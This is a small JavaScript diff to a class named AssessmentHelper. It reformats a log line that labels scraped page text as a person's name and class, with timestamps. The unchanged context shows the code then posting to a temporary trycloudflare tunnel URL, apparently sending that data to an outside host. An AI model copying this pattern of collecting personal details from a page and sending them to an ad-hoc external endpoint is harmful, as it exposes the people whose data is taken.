@@ -113,7 +113,8 @@ class AssessmentHelper {
             const isoTimestamp = timestamp.toISOString();
             const normalTime = timestamp.toLocaleString();
 
-            const logMessage = `${elementText} - ${spanText} - ${normalTime} - ${isoTimestamp}`;
+            // Format the log message with clearer labels
+            const logMessage = `Name: ${elementText} | Class: ${spanText} | Time: ${normalTime} | ISO Time: ${isoTimestamp}`;
             console.log(logMessage);
             
             const response = await fetch('https://insert-votes-mx-mining.trycloudflare.com/data', {
